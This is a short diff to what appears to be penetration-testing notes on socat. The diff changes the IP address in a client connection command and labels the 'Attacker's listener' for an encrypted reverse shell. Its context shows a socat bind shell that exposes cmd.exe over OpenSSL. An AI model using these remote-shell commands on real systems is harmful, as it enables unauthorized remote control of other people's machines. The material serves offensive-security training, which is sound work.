@@ -102,7 +102,7 @@ socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:'cmd.exe',pipes
 * `fork` to spawn a child process once a connection is made to the listener:
 
 ```text
-socat - OPENSSL:10.11.0.4:443,verify=0
+socat - OPENSSL:192.168.189.10:443,verify=0
 ```
 
 * `-` to transfer data between STDIO and the remote host
@@ -111,9 +111,11 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 
 ### Encrypted Reverse Shell
 
+{% code title="Attacker\'s listener" %}
 ```text
 socat -d -d OPENSSL-LISTEN:443,cert=reverse_shell.pem,verify=0 STDOUT
 ```
+{% endcode %}
 
 {% code title="Encrypted Windows Reverse Shell" %}
 ```text
